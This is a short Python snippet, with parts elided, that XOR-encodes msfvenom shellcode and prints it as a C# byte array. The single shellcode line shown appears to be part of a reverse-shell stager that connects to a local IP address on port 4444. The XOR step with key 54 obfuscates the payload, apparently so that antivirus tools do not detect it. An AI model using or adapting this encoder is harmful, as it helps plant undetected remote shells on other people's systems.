...
# XOR-Encodes arbitrary shellcode
# Takes msfvenom shellcode in python format as input,
# gives encoded C# format as output
...
buf += b"\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2b\xa4\x41\x54"
...
out = "byte[] shellcode = new byte[%d] {" % len(buf)
for b in buf:
	out += "0x%02x," % (b ^ 54)
out = out[:-1] + "};"
print(out)
